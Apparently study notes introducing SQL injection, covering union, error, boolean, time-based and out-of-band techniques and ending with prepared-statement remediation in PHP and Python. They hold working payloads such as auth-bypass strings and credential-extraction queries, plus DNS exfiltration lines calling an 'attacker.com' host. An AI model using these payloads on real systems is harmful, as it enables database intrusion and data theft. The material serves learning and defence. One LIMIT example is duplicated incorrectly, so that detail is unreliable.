# SQL Injection Introduction

SQL injection happens when the attacker could manipulate sql queries that the web application sends to the database.

Consequnces: Access to sensitive data, bypass auth, modifying or deleting records, control of database.

## SQL Essentials for Injection

### SQL Comments

MySQL comments command: `-- `, `# ` - single line comment, `/* */` - multi line comments.

Used to cut off unnecessary part of sql query.

ORIGINAL:

`SELECT * FROM users WHERE username='INPUT' AND password='secret';`

MODIFIED:

`SELECT * FROM users WHERE username='admin'-- AND password='secret';`

### UNION

UNION operator combines the result of two or more SELECT operators in a single result.

One rule: both SELECT operator results should return same number of columns with compatible data types.

Attacker will use UNION operator to include their own SELECT command with a legitamate query.

`SELECT name, age FROM students UNION SELECT username, id FROM admins;`

### LIKE and Wildcards

`LIKE` operator used for pattern matching string.

`%` - matches any sequence of character

`-` - matches one character

Command example:

`SELECT * FROM users WHERE username LIKE 'adm%';`

Returns any string with starting adm.

Attacker could use this operator to enumerate data one char at a time, until fully matching.

### LIMIT

`LIMIT` operation returns the number of rows. Let's the user control the output size

`SELECT * FROM users LIMIT 1;` --> ouptuts only the first row
`SELECT * FROM users LIMIT 1;` --> skips 2 rows, returns the 3rd

In injection used for controlling which row is returned or preventing the output from too large output size.

### String Functions

Extracting data from the injection: (Functions)

1. group_concat() - combines output from different responses into one single comma separated string.
2. CONCAT() - joins values together.

Example:

group_concat() = `SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users`

CONCAT() = `CONCAT(username, ':', password)`

### The information_schema Database

MySQL, MariaDB, and PostgreSQL servers have built in database: information_schema.

This database contains info about every other database on the server

Two tables most valuable in injection:

1. information_schema.tables: lists every table: table_schema holds database name, table_name holds table name.
2. information_schema.columns: lists every columns: table_name and column_name columns holds structure of any table.

## What is SQL Injection?

User input field is used for SQL query, additionaly input field should not contain sanitisation or parameterisation.
Web server will assume that the attacker input is SQL code.

### How Web Applications Use SQL

Many pages from website generated from database.

user input data sends to SQL queries and then results returned to the user.

### Where the vulnerability lives

The problem is when the website allows any user input transfrom into SQL query.

`SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;`

`OR 1=1` --> makes the WHERE operator always true.

### Three type of SQL injection

The injections categorized based on how the attacker receives the feedback.

1. IN-band SQL Injections: feedback returned in web-application's response.
2. Blind SQL Injections: does not display query or error messages. Attacker must test indirect signals(Auth bypass, boolean-based, time-based)
3. OUT-of-band SQL Injections: when attacker causes target server make external request that exfiltrates data through a separate server.

### Detecting SQL Injection

Inject characters and watch for response.
`'` : if returns database error, the input inserted into SQL query. Or user double quotes (`"`)
`;--` : if the application behaves differently, returns different content
`OR 1=1` : if it changes the result

If not visible check for boolean based or time based solutions.

## IN BAND SQL injections

In Band --> same communicational channel.

### Error Based SQL Injection

Exploits error messages that user receives.

If database is not configured it could leak information about query structure, table names, data.

Error Based Injections => reveal structual information.

### Union Based SQL Injection

Union Based Injection => method for extracting large amount of data.

It uses UNION operator to combine custom made SELECT query to original one.

UNION operator requires that two or more queries columns need to be equal.

OUTPUT:

`1 UNION SELECT 1          -- error (wrong column count)
1 UNION SELECT 1,2        -- error (still wrong)
1 UNION SELECT 1,2,3      -- success! The table has 3 columns`

Change the original query value to 0 (smth that doesn't change), so the UNION output is displayed.

COMMAND:

`0 UNION SELECT 1,2,database()`

use database command to reveal current database name.

information_schema.tables => to list all tables in target database.

information_schema.columns => to list all columns in target database.

group_concat(username,':',password SEPARATOR '<br>') FROM target_table => to extract data

## Blind SQL Injection: Auth Bypass

No error or any response from database => use blind sql injection

See the action or hints from the application behavior.

Auth Bypass is one of the easiest to see.

Auth query will look like:

`SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;`

### The Attack

Don't need to know any cred.

`SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;`

Makes everything true after WHERE clause because of `OR 1=1`, and ignored everything after `;--`

Additionally if the username is known:

`SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;`

selects the target username as 'admin'

### Variations of payload

`' OR 1=1;--` => classic one, works when username wrapped into single quotes

`' OR 1=1;#` => MySQL alternative

`" OR 1=1--` => for queries that use double quotes around input field

## Blind SQL Injection: Boolean and Time based

No visible output.

This method will give you data one char at a time.

### Boolean Based Blind Injection

The application sends binary signal.

Saves the info in different page (json file), true-false values.

Using UNION SELECT with a condition the attacker could ask for specific yes or no question and obtain the data.

Check if the injections is passed:

`admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--`

`'%'` => wildcard that matches anything.

Check the database name character by character:

`admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--`

If false try b,c ..., after receiving true keep enumerating other characters.

Get column and table names:

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--

Loop through characters and after finishing with information_schema.tables, next step is information_schema.columns.

### Time Based Blind SQL Injection

Nothing to work with visually.

Only signal is how much time is response coming from the server.

The command to enumerate through database name, if s is present in name response time will take around 5 seconds, if not it will run right away:

`admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--`

#### Finding column count

`admin123' UNION SELECT SLEEP(5),2;--`

If response time is 5 seconds the column count is 2.

#### Enumerating data

`admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE 'password123%';--`

delay => true, no delay => false.

## Out-of-Band (OOB) SQL Injection

Forcing the database server to reaching out to the contolled server through different channel.

Use if everything else if failed and firewall is not blocking outband connections.

Less used compared to the in-band or blind.

### How it works.

Attack Channel => web request with injection payload
Data Channel => outband request that the database makes to your server, with the exfiltrated data.

### DNS Exfiltration with MySQL

Uses LOAD_FILE() to trigger DNS lookup.

`SELECT LOAD_FILE(CONCAT('\\\\'(SELECT database()) '.attacker.com\\share'));`

`SELECT database()` => pulls database name
`CONCAT()` => builds string
`LOAD_FILE()` => reading the file path

### MSSQL Techniques (Microsoft SQL)

`xp_dirtree` => triggers dns lookup by trying to show the list on a remote server

`EXEC master..xp_dirtree '\\attacker.com\share';`

`xp_cmdshell` => triggers command running, turned off by default

`EXEC xp_cmdshell 'nslookup data.attacker.com';`

### Receiving the Data

Burp Collaborator, Interactsh, python dnslib custom server, bare-bones HTTP Server.

### Constraints

1. Most databases restring outband network access.
2. Different databases, different payloads.
3. Characters limitation of 63 for dns exfiltration.
4. Slower than pulling data directly.

## Remediation and Prevention

Explaining the exploit is important.

### Prepared Statements

### PHP:

Vulnerable code:
`$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);`

Attacker could escape the qoutes and put vulnerable code.

Fixed code:

`$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();`

Not touches the query structure, whole placehold(?) will be treated as a whole string.

### Python:

Vulnerable code:

`query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)`

Fixed code:

`cursor.execute("SELECT * FROM users WHERE username = %s", (username,))`

%s => placeholder

User cannot change the query structure.

### Input Validation

What application accepts until anythign reaches database.

Best approach: allowlisting.

`if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}`

Never realy solely on allowlisting because an attacker will eventually find something to go through filter.

### Escaping User Input

Putting backlash before special characters so database thinks it is literals.

Databsase specificity and fragility makes this method more high level defense.
